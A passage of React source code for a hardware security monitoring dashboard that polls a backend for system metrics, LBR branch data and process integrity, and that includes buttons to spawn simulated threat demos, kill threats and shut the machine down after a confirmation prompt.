          <span className={metrics?.vm_detected ? 'text-yellow-500' : 'text-green-400'}>
            {metrics?.vm_detected ? metrics?.vm_type || 'VM' : 'Native'}
          </span>
        </div>
        <div className="flex justify-between">
          <span className="text-gray-500">Ring Level:</span>
          <span className="text-[#a855f7]">Ring {metrics?.ring_level || 3}</span>
        </div>
      </div>
    </motion.div>
  </motion.div>
);

// Connection Status Indicator
const ConnectionStatus = ({ connected, onRetry }) => (
  <motion.div
    initial={{ opacity: 0 }}
    animate={{ opacity: 1 }}
    className={`fixed top-4 right-4 z-50 px-4 py-2 rounded-xl flex items-center gap-2 ${
      connected 
        ? 'bg-green-500/20 border border-green-500/30' 
        : 'bg-red-500/20 border border-red-500/30'
    }`}
  >
    <div className={`w-2 h-2 rounded-full ${connected ? 'bg-green-500' : 'bg-red-500'} animate-pulse`} />
    <span className={`text-xs ${connected ? 'text-green-400' : 'text-red-400'}`}>
      {connected ? 'Backend Connected' : 'Backend Offline'}
    </span>
    {!connected && (
      <button onClick={onRetry} className="ml-2 text-red-400 hover:text-red-300">
        <RefreshCw size={12} />
      </button>
    )}
  </motion.div>
);

// Main Dashboard Component
const Dashboard = () => {
  // State for real data from API
  const [processes, setProcesses] = useState([]);
  const [isScanning, setIsScanning] = useState(false);
  const [searchPid, setSearchPid] = useState('');
  const [pidSearchResult, setPidSearchResult] = useState(null);
  const [cpuUsage, setCpuUsage] = useState(0);
  const [memoryUsage, setMemoryUsage] = useState({ used_gb: 0, total_gb: 0, percent: 0 });
  const [kernelConnected, setKernelConnected] = useState(false);
  const [integrityScore, setIntegrityScore] = useState(100);
  const [integrityStatus, setIntegrityStatus] = useState('SECURE');
  const [integrityData, setIntegrityData] = useState({ factors: {}, deductions: [] });
  const [selectedThreat, setSelectedThreat] = useState(null);
  const [alert, setAlert] = useState(null);
  const [systemInfo, setSystemInfo] = useState('Connecting to KARAN-KAVACH...');
  const [consoleLogs, setConsoleLogs] = useState([
    { time: '00:00:00', message: 'Initializing KARAN-KAVACH...', type: 'info' },
  ]);
  const [securityMetrics, setSecurityMetrics] = useState({
    branches_monitored: 0,
    threats_blocked: 0,
    lbr_entries: 0,
    total_processes: 0,
    threat_processes: 0,
    lbr_supported: false,
    uptime_seconds: 0,
    uptime_percent: 0,
    vm_detected: false,
    vm_type: 'Native',
    ring_level: 3,
  });
  const [lbrData, setLbrData] = useState({ entries: [], supported: false, cpu_vendor: 'Unknown' });
  const [networkData, setNetworkData] = useState({ suspicious_count: 0, total: 0 });
  const [apiConnected, setApiConnected] = useState(false);
  const [simulatedThreats, setSimulatedThreats] = useState([]);
  const [executingThreats, setExecutingThreats] = useState({});
  const [globalSearchQuery, setGlobalSearchQuery] = useState('');
  const [searchQuery, setSearchQuery] = useState('');
  const [isShuttingDown, setIsShuttingDown] = useState(false);
  const [showNotifications, setShowNotifications] = useState(false);
  const [showSettings, setShowSettings] = useState(false);
  const [showLBRAnalytics, setShowLBRAnalytics] = useState(false);
  const [activeView, setActiveView] = useState('dashboard');
  const [settings, setSettings] = useState({
    refreshInterval: 2,
    soundAlerts: true,
    darkMode: true,
    autoKill: false,
  });
  
  const pollingRef = useRef(null);

  // Settings change handler
  const handleSettingsChange = useCallback((key, value) => {
    setSettings(prev => ({ ...prev, [key]: value }));
    
    // If refresh interval changed, update polling
    if (key === 'refreshInterval' && pollingRef.current) {
      // Will be applied on next render cycle
    }
  }, []);

  // Add log function
  const addLog = useCallback((message, type = 'info') => {
    const time = new Date().toLocaleTimeString('en-US', { hour12: false });
    setConsoleLogs(prev => [...prev.slice(-19), { time, message, type }]);
  }, []);

  // Fetch initial status and start polling
  useEffect(() => {
    const fetchStatus = async () => {
      try {
        const status = await api.get('/status');
        if (status) {
          setApiConnected(true);
          setKernelConnected(true);
          
          // Update system info
          if (status.system_info?.system_string) {
            setSystemInfo(status.system_info.system_string);
          }
          
          // Update CPU
          if (status.cpu) {
            setCpuUsage(status.cpu.usage || 0);
          }
          
          // Update memory
          if (status.memory) {
            setMemoryUsage(status.memory);
          }
          
          // Update integrity - NOW STORES FULL DATA
          if (status.integrity) {
            setIntegrityScore(status.integrity.score || 100);
            setIntegrityStatus(status.integrity.status || 'SECURE');
            setIntegrityData(status.integrity);  // Store full integrity data
          }
          
          // Update metrics
          if (status.metrics) {
            setSecurityMetrics(status.metrics);
          }
          
          // Update LBR data
          if (status.lbr) {
            setLbrData(status.lbr);
          }
          
          // Update logs from backend
          if (status.console_logs && status.console_logs.length > 0) {
            setConsoleLogs(prev => {
              const newLogs = status.console_logs.filter(
                log => !prev.some(p => p.time === log.time && p.message === log.message)
              );
              return [...prev, ...newLogs].slice(-20);
            });
          }
          
          addLog('Connected to KARAN-KAVACH backend', 'success');
        } else {
          setApiConnected(false);
          setKernelConnected(false);
          addLog('Backend connection failed - using fallback mode', 'warning');
        }
      } catch (error) {
        setApiConnected(false);
        setKernelConnected(false);
        addLog(`Connection error: ${error.message}`, 'error');
      }
    };

    fetchStatus();
    
    // Poll for updates based on settings refresh interval
    pollingRef.current = setInterval(async () => {
      try {
        // Fetch CPU
        const cpu = await api.get('/cpu');
        if (cpu) {
          setCpuUsage(cpu.usage || 0);
          setKernelConnected(cpu.connected !== false);
          setApiConnected(true);
        }
        
        // Fetch memory
        const memory = await api.get('/memory');
        if (memory) {
          setMemoryUsage(memory);
        }
        
        // Fetch integrity - NOW STORES FULL DATA
        const integrity = await api.get('/integrity');
        if (integrity) {
          setIntegrityScore(integrity.score || 100);
          setIntegrityStatus(integrity.status || 'SECURE');
          setIntegrityData(integrity);  // Store full integrity data
        }
        
        // Fetch metrics
        const metrics = await api.get('/metrics');
        if (metrics) {
          setSecurityMetrics(metrics);
        }
        
        // Fetch LBR data
        const lbr = await api.get('/lbr');
        if (lbr) {
          setLbrData(lbr);
        }
        
        // Fetch simulated threats
        const simThreats = await api.get('/simulated_threats');
        if (simThreats && simThreats.threats) {
          setSimulatedThreats(simThreats.threats);
          // Update executing status based on active threats
          const activeThreats = {};
          simThreats.threats.forEach(t => {
            activeThreats[t.threat_type] = true;
          });
          setExecutingThreats(activeThreats);
        }
        
      } catch (error) {
        // Silent fail for polling
      }
    }, settings.refreshInterval * 1000);

    return () => {
      if (pollingRef.current) {
        clearInterval(pollingRef.current);
      }
    };
  }, [addLog, settings.refreshInterval]);

  // Fetch processes on mount and periodically
  useEffect(() => {
    const fetchProcesses = async () => {
      const data = await api.get('/processes');
      if (data && data.processes) {
        // Also get simulated threats and add them
        const simThreats = await api.get('/simulated_threats');
        let combinedProcesses = [...data.processes];
        
        if (simThreats && simThreats.threats && simThreats.threats.length > 0) {
          simThreats.threats.forEach(threat => {
            combinedProcesses.unshift({
              pid: threat.pid,
              name: threat.name,
              status: 'THREAT',
              cpu_percent: threat.cpu_percent,
              memory_percent: threat.memory_percent,
              highlighted: true,
              simulated: true,
            });
          });
          setSimulatedThreats(simThreats.threats);
        }
        
        setProcesses(combinedProcesses);
        addLog(`Loaded ${data.processes.length} real processes`, 'success');
      } else {
        // Use fallback data
        setProcesses(generateProcesses());
        addLog('Using simulated process data', 'warning');
      }
    };
    
    fetchProcesses();
    
    // Also refetch processes every 3 seconds to catch simulated threat updates
    const processInterval = setInterval(fetchProcesses, 3000);
    return () => clearInterval(processInterval);
  }, [addLog]);

  // Handle deep scan with real API
  const handleScan = useCallback(async () => {
    setIsScanning(true);
    addLog('Initiating REAL deep scan of all PIDs...', 'info');
    
    try {
      const result = await api.post('/scan');
      
      if (result) {
        setProcesses(result.processes || []);
        setIntegrityScore(result.integrity?.score || 100);
        setIntegrityStatus(result.integrity?.status || 'SECURE');
        setSecurityMetrics(prev => ({
          ...prev,
          total_processes: result.processes?.length || 0,
          threat_processes: result.processes?.filter(p => p.status === 'THREAT').length || 0,
        }));
        
        const threatCount = result.processes?.filter(p => p.status === 'THREAT').length || 0;
        
        if (threatCount > 0) {
          addLog(`SCAN COMPLETE: ${threatCount} THREATS DETECTED!`, 'error');
          setAlert({ 
            type: 'danger', 
            message: `${threatCount} THREATS DETECTED - Review process list` 
          });
        } else {
          addLog('Scan complete: System secure', 'success');
          setAlert({ type: 'success', message: 'SYSTEM SECURE - No threats detected' });
        }
        
        // Update logs from scan result
        if (result.console_logs) {
          result.console_logs.forEach(log => {
            addLog(log.message, log.type);
          });
        }
        
        setTimeout(() => setAlert(null), 4000);
      } else {
        addLog('Scan failed - API unavailable', 'error');
        // Fallback to simulated scan
        setTimeout(() => {
          setProcesses(prev => prev.map(proc => ({
            ...proc,
            status: Math.random() > 0.9 ? 'THREAT' : 'SAFE',
          })));
          setIsScanning(false);
        }, 2000);
      }
    } catch (error) {
      addLog(`Scan error: ${error.message}`, 'error');
    }
    
    setIsScanning(false);
  }, [addLog]);

  // Handle PID search with real API
  const handlePidSearch = useCallback(async () => {
    const pid = parseInt(searchPid);
    if (isNaN(pid)) {
      setPidSearchResult({ found: false, message: 'Invalid PID format' });
      return;
    }
    
    addLog(`Searching for PID ${pid}...`, 'info');
    
    try {
      const result = await api.get(`/process/${pid}`);
      
      if (result && result.found) {
        setProcesses(prev => prev.map(p => ({
          ...p,
          highlighted: p.pid === pid,
        })));
        setPidSearchResult({ 
          found: true, 
          message: `PID ${pid}: ${result.name} - ${result.status}` 
        });
        addLog(`PID ${pid} located: ${result.name} (${result.status})`, 'success');
      } else {
        // Check local processes
        const found = processes.find(p => p.pid === pid);
        if (found) {
          setProcesses(prev => prev.map(p => ({
            ...p,
            highlighted: p.pid === pid,
          })));
          setPidSearchResult({ found: true, message: `PID ${pid}: ${found.name} - ${found.status}` });
          addLog(`PID ${pid} located locally: ${found.name}`, 'success');
        } else {
          setPidSearchResult({ found: false, message: 'No such PID running.' });
          addLog(`PID ${pid} not found in process list`, 'error');
        }
      }
    } catch (error) {
      // Fallback to local search
      const found = processes.find(p => p.pid === pid);
      if (found) {
        setProcesses(prev => prev.map(p => ({
          ...p,
          highlighted: p.pid === pid,
        })));
        setPidSearchResult({ found: true, message: `PID ${pid}: ${found.name} - ${found.status}` });
      } else {
        setPidSearchResult({ found: false, message: 'No such PID running.' });
      }
    }
  }, [searchPid, processes, addLog]);

  const handleShowCode = useCallback((threatType) => {
    setSelectedThreat(threatType);
    addLog(`Viewing exploit code: ${threatType}`, 'warning');
  }, [addLog]);

  const handleExecuteThreat = useCallback(async (threatType) => {
    if (executingThreats[threatType]) {
      addLog(`${threatType} already running`, 'warning');
      return;
    }
    
    addLog(`[DEMO] Executing simulated threat: ${threatType}`, 'warning');
    setExecutingThreats(prev => ({ ...prev, [threatType]: true }));
    
    try {
      const result = await api.post('/simulate_threat', { threat_type: threatType });
      
      if (result && result.success) {
        addLog(`[DEMO] Threat spawned: ${result.name} (PID: ${result.pid})`, 'error');
        setAlert({ 
          type: 'danger', 
          message: `⚠️ THREAT DETECTED: ${result.name} - Auto-stopping in 8s` 
        });
        
        // Refresh processes to include simulated threat
        const data = await api.get('/processes');
        if (data && data.processes) {
          // Add simulated threat to process list
          const simThreats = await api.get('/simulated_threats');
          if (simThreats && simThreats.threats) {
            const combinedProcesses = [...data.processes];
            simThreats.threats.forEach(threat => {
              combinedProcesses.unshift({
                pid: threat.pid,
                name: threat.name,
                status: 'THREAT',
                cpu_percent: threat.cpu_percent,
                memory_percent: threat.memory_percent,
                highlighted: true,
                simulated: true,
              });
            });
            setProcesses(combinedProcesses);
            setSimulatedThreats(simThreats.threats);
          }
        }
        
        // Auto clear alert after 4 seconds
        setTimeout(() => setAlert(null), 4000);
      }
    } catch (error) {
      addLog(`Failed to execute threat: ${error.message}`, 'error');
      setExecutingThreats(prev => ({ ...prev, [threatType]: false }));
    }
  }, [addLog, executingThreats]);

  const handleAlertFromIntegrity = useCallback((alertData) => {
    setAlert(alertData);
    addLog(alertData.message, alertData.type === 'success' ? 'success' : 'error');
    setTimeout(() => setAlert(null), 4000);
  }, [addLog]);

  const retryConnection = useCallback(async () => {
    addLog('Retrying backend connection...', 'info');
    const status = await api.get('/status');
    if (status) {
      setApiConnected(true);
      setKernelConnected(true);
      addLog('Reconnected to backend', 'success');
    } else {
      addLog('Reconnection failed', 'error');
    }
  }, [addLog]);

  const handleKillAllThreats = useCallback(async () => {
    addLog('Initiating kill all threats...', 'warning');
    
    try {
      const result = await api.post('/kill_all_threats');
      
      if (result && result.success) {
        const { killed, failed, simulated_cleared } = result;
        addLog(`Killed ${killed.length} threats, ${failed.length} failed, ${simulated_cleared} simulated cleared`, 'success');
        
        setAlert({ 
          type: 'success', 
          message: `✅ Stopped ${killed.length + simulated_cleared} threats successfully` 
        });
        
        // Refresh processes
        const data = await api.get('/processes');
        if (data && data.processes) {
          setProcesses(data.processes);
        }
        
        // Clear simulated threats state
        setSimulatedThreats([]);
        setExecutingThreats({});
        
        setTimeout(() => setAlert(null), 4000);
      } else {
        addLog('Failed to kill threats', 'error');
        setAlert({ type: 'danger', message: 'Failed to stop threats' });
        setTimeout(() => setAlert(null), 4000);
      }
    } catch (error) {
      addLog(`Error killing threats: ${error.message}`, 'error');
    }
  }, [addLog]);

  const handleShutdown = useCallback(async () => {
    // Confirm with user
    if (!window.confirm('⚠️ Are you sure you want to SHUTDOWN this PC? All unsaved work will be lost!')) {
      addLog('Shutdown cancelled by user', 'info');
      return;
    }
    
    addLog('SYSTEM SHUTDOWN INITIATED!', 'error');
    setAlert({ type: 'danger', message: '⚠️ SYSTEM SHUTDOWN INITIATED...' });
    
    try {
      const result = await api.post('/shutdown');
      
      if (result && result.success) {
        addLog(result.message, 'warning');
      } else {
        addLog(`Shutdown failed: ${result?.message || 'Unknown error'}`, 'error');
        setAlert({ type: 'danger', message: `Shutdown failed: ${result?.message || 'Unknown error'}` });
        setTimeout(() => setAlert(null), 4000);
      }
    } catch (error) {
      addLog(`Shutdown error: ${error.message}`, 'error');
      setAlert({ type: 'danger', message: `Shutdown error: ${error.message}` });
      setTimeout(() => setAlert(null), 4000);
    }
  }, [addLog]);

  // Search for processes (used by RightPanel search bar)
  const handleSearch = useCallback(async () => {
    if (!searchQuery.trim()) {
      // Clear highlights if search is empty
      setProcesses(prev => prev.map(p => ({ ...p, highlighted: false })));
      addLog('Search cleared', 'info');
      return;
    }
    
    addLog(`Searching for: ${searchQuery}`, 'info');
    
    try {
      const result = await api.get(`/search_processes?q=${encodeURIComponent(searchQuery)}`);
      
      if (result && result.processes) {
        addLog(`Found ${result.total} processes matching "${searchQuery}"`, 'success');
        
        // Highlight matching processes in the main list
        setProcesses(prev => prev.map(p => ({
          ...p,
          highlighted: result.processes.some(rp => rp.pid === p.pid),
        })));
        
        if (result.total === 0) {
          setAlert({ type: 'warning', message: `No processes found matching "${searchQuery}"` });
        } else {
          setAlert({ type: 'success', message: `Found ${result.total} processes matching "${searchQuery}"` });
        }
        setTimeout(() => setAlert(null), 3000);
      }
    } catch (error) {
      addLog(`Search failed: ${error.message}`, 'error');
    }
  }, [searchQuery, addLog]);

  const handleGlobalSearch = useCallback(async () => {
    if (!globalSearchQuery.trim()) {
      addLog('Please enter a search query', 'warning');
      return;
    }
    
    addLog(`Searching for: ${globalSearchQuery}`, 'info');
    
    try {
      const result = await api.get(`/search_processes?q=${encodeURIComponent(globalSearchQuery)}`);
      
      if (result && result.processes) {
        addLog(`Found ${result.total} processes matching "${globalSearchQuery}"`, 'success');
        
        // Highlight matching processes in the main list
        setProcesses(prev => prev.map(p => ({
          ...p,
          highlighted: result.processes.some(rp => rp.pid === p.pid),
        })));
        
        if (result.total === 0) {
          setAlert({ type: 'warning', message: `No processes found matching "${globalSearchQuery}"` });
        } else {
          setAlert({ type: 'success', message: `Found ${result.total} processes matching "${globalSearchQuery}"` });
        }
        setTimeout(() => setAlert(null), 3000);
      }
    } catch (error) {
      addLog(`Search failed: ${error.message}`, 'error');
    }
  }, [globalSearchQuery, addLog]);

  const threatDemos = [
    { title: 'Buffer Overflow', icon: Bug, severity: 75, color: '#f53d7a' },
    { title: 'Return Oriented Programming (ROP)', icon: GitBranch, severity: 85, color: '#a855f7' },
    { title: 'Kernel Bypass', icon: ShieldAlert, severity: 95, color: '#ef4444' },
  ];

  return (
    <div className="w-full min-h-screen flex flex-col items-center justify-center p-4 bg-[#0d0e10]">
      {/* Connection Status */}
      <ConnectionStatus connected={apiConnected} onRetry={retryConnection} />
      
      <motion.div
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        transition={{ duration: 0.5 }}
        className="w-full max-w-[1400px] h-[850px] bg-[#1a1c20] rounded-[40px] overflow-hidden flex flex-col"
        style={{
          boxShadow: '20px 20px 60px #111215, -10px -10px 30px #232529',
        }}
      >
        <div className="flex flex-1 overflow-hidden">
          {/* Sidebar */}
          <Sidebar
            processes={processes}
            onScan={handleScan}
            isScanning={isScanning}
            onPidSearch={handlePidSearch}
            searchPid={searchPid}
            setSearchPid={setSearchPid}
            pidSearchResult={pidSearchResult}
            activeView={activeView}
            setActiveView={setActiveView}
            onOpenLBRAnalytics={() => setShowLBRAnalytics(true)}
            onOpenSettings={() => setShowSettings(true)}
          />

          {/* Main Content */}
          <motion.div
            variants={containerVariants}
            initial="hidden"
            animate="visible"
            className="flex-1 py-6 px-8 overflow-y-auto"
          >
            {/* Header */}
            <div className="flex items-center justify-between mb-6">
              <div>
                <motion.div
                  initial={{ opacity: 0, y: -20 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="flex items-center gap-2 mb-1"
                >
                  <Wifi size={14} className="text-[#4ceccb]" />
                  <span className="text-[#4ceccb] text-xs font-mono">{systemInfo}</span>
                </motion.div>
                <motion.h1
                  initial={{ opacity: 0, y: -20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.1 }}
                  className="text-white text-2xl font-bold"
                >
                  Hardware Security Monitor
                </motion.h1>
                <motion.p
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.2 }}
                  className="text-gray-500 text-sm"
                >
                  LBR-Based Memory Exploitation Detection
                </motion.p>
              </div>

              {/* Search Bar */}
              <motion.div
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                className="flex items-center gap-4"
              >
                <div className="relative">
                  <div className="bg-[#1a1c20] rounded-xl px-4 py-2.5 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138] flex items-center gap-2 w-56">
                    <Search size={16} className="text-gray-500" />
                    <input
                      type="text"
                      placeholder="Search threats..."
                      value={globalSearchQuery}
                      onChange={(e) => setGlobalSearchQuery(e.target.value)}
                      onKeyDown={(e) => e.key === 'Enter' && handleGlobalSearch()}
                      className="bg-transparent text-white text-sm outline-none placeholder:text-gray-600 w-full"
                    />
                  </div>
                </div>
                <motion.button
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                  onClick={() => setShowNotifications(true)}
                  className="w-10 h-10 rounded-xl bg-[#23262b] shadow-[10px_10px_20px_#111215,-5px_-5px_15px_#2d3138] flex items-center justify-center relative"
                >
                  <Bell size={18} className="text-gray-400" />
                  {(simulatedThreats.length > 0 || !lbrData?.supported || integrityScore < 70) && (
                    <div className="absolute top-2 right-2 w-2 h-2 bg-[#f53d7a] rounded-full animate-pulse"></div>
                  )}
                </motion.button>
              </motion.div>
            </div>

            {/* KPI Cards Row */}
            <motion.div
              variants={containerVariants}
              className="grid grid-cols-3 gap-4 mb-4"
            >
              <CPUKPICard cpuUsage={cpuUsage} kernelConnected={kernelConnected} />
              
              <motion.div
                variants={itemVariants}
                whileHover={{ scale: 1.02, y: -5 }}
                className="bg-[#23262b] rounded-2xl p-5 shadow-[10px_10px_20px_#111215,-5px_-5px_15px_#2d3138]"
              >
                <div className="flex items-start justify-between mb-4">
                  <div className="w-10 h-10 rounded-xl bg-[#1a1c20] shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138] flex items-center justify-center">
                    <MemoryStick size={18} className="text-[#a855f7]" strokeWidth={1.5} />
                  </div>
                  <span className="text-xs text-green-400 flex items-center gap-1">
                    <TrendingUp size={12} />
                    {memoryUsage.percent < 80 ? 'Protected' : 'High'}
                  </span>
                </div>
                <p className="text-gray-500 text-xs uppercase tracking-wider mb-1">Memory Usage</p>
                <p className="text-white text-2xl font-bold">
                  {memoryUsage.used_gb ? `${memoryUsage.used_gb} GB` : '-.-- GB'}
                </p>
                <div className="mt-2 h-1 bg-[#1a1c20] rounded-full overflow-hidden shadow-[inset_2px_2px_4px_#111215]">
                  <motion.div
                    className="h-full bg-gradient-to-r from-[#a855f7] to-[#f53d7a]"
                    initial={{ width: 0 }}
                    animate={{ width: `${memoryUsage.percent || 0}%` }}
                    transition={{ duration: 0.5 }}
                  />
                </div>
              </motion.div>

              <motion.div
                variants={itemVariants}
                whileHover={{ scale: 1.02, y: -5 }}
                className="bg-[#23262b] rounded-2xl p-5 shadow-[10px_10px_20px_#111215,-5px_-5px_15px_#2d3138]"
              >
                <div className="flex items-start justify-between mb-4">
                  <div className="w-10 h-10 rounded-xl bg-[#1a1c20] shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138] flex items-center justify-center">
                    <Binary size={18} className="text-[#f53d7a]" strokeWidth={1.5} />
                  </div>
                  <span className={`text-xs flex items-center gap-1 ${
                    securityMetrics.threat_processes > 0 ? 'text-[#f53d7a]' : 'text-green-400'
                  }`}>
                    <AlertOctagon size={12} />
                    {securityMetrics.threat_processes > 0 ? `${securityMetrics.threat_processes} Active` : 'Clear'}
                  </span>
                </div>
                <p className="text-gray-500 text-xs uppercase tracking-wider mb-1">Active Threats</p>
                <p className="text-white text-2xl font-bold">{securityMetrics.threat_processes || 0}</p>
                <p className="text-gray-500 text-xs mt-1">
                  of {securityMetrics.total_processes || 0} processes scanned
                </p>
              </motion.div>
            </motion.div>

            {/* Threat Demos Row */}
            <motion.div variants={containerVariants} className="mb-4">
              <h3 className="text-white font-semibold mb-3 flex items-center gap-2">
                <AlertTriangle size={16} className="text-[#f53d7a]" />
                Threat Laboratory
                {simulatedThreats.length > 0 && (
                  <span className="text-xs bg-red-500/20 text-red-400 px-2 py-0.5 rounded-full">
                    {simulatedThreats.length} Active
                  </span>
                )}
              </h3>
              <div className="grid grid-cols-3 gap-4">
                {threatDemos.map((demo) => (
                  <ThreatDemoCard
                    key={demo.title}
                    {...demo}
                    onShowCode={() => handleShowCode(demo.title)}
                    onExecute={() => handleExecuteThreat(demo.title)}
                    isExecuting={executingThreats[demo.title] || false}
                  />
                ))}
              </div>
            </motion.div>

            {/* Main Stats Grid */}
            <motion.div
              variants={containerVariants}
              className="grid grid-cols-2 gap-4 mb-4"
            >
              <IntegrityScoreCard 
                score={integrityScore} 
                onAlert={handleAlertFromIntegrity} 
                integrityData={integrityData}
                lbrData={lbrData}
              />
              <LBRInsights lbrData={lbrData} />
            </motion.div>

            {/* Debug Console */}
            <motion.div variants={containerVariants}>
              <DebugConsole logs={consoleLogs} />
            </motion.div>
            
            {/* Reports Section */}
            <motion.div variants={containerVariants} className="mt-4">
              <ReportsSection 
                cpuUsage={cpuUsage}
                memoryUsage={memoryUsage}
                integrityScore={integrityScore}
                integrityData={integrityData}
                securityMetrics={securityMetrics}
                lbrData={lbrData}
                processes={processes}
                simulatedThreats={simulatedThreats}
              />
            </motion.div>
          </motion.div>

          {/* Right Panel */}
          <RightPanel 
            onKillAllThreats={handleKillAllThreats}
            onShutdown={handleShutdown}
            searchQuery={searchQuery}
            setSearchQuery={setSearchQuery}
            onSearch={handleSearch}
            isShuttingDown={isShuttingDown}
            metrics={securityMetrics}
            lbrData={lbrData}
          />
        </div>

        {/* Footer */}
        <div className="py-3 text-center border-t border-white/5">
          <p className="text-gray-600 text-xs">
            Built with dedication from <span className="text-[#4ceccb]">VISHAL</span>, <span className="text-[#a855f7]">KESHAV</span>, <span className="text-[#f53d7a]">SANKALP</span>
          </p>
        </div>
      </motion.div>

      {/* Modals */}
      <CodeModal
        isOpen={!!selectedThreat}
        onClose={() => setSelectedThreat(null)}
        title={selectedThreat}
        code={malwareCodeSamples[selectedThreat] || '// Code not available'}
      />

      {/* Alert Toast */}
      <AlertToast alert={alert} onClose={() => setAlert(null)} />
      
      {/* Notifications Panel */}
      <NotificationsPanel 
        isOpen={showNotifications}
        onClose={() => setShowNotifications(false)}
        threats={simulatedThreats}
        lbrData={lbrData}
        integrityScore={integrityScore}
      />
      
      {/* Settings Modal */}
      <SettingsModal 
        isOpen={showSettings}
        onClose={() => setShowSettings(false)}
        settings={settings}
        onSettingsChange={handleSettingsChange}
      />
      
      {/* LBR Analytics Panel */}
      <LBRAnalyticsPanel 
        isOpen={showLBRAnalytics}
        onClose={() => setShowLBRAnalytics(false)}
        lbrData={lbrData}
      />
    </div>
  );
};

export default Dashboard;
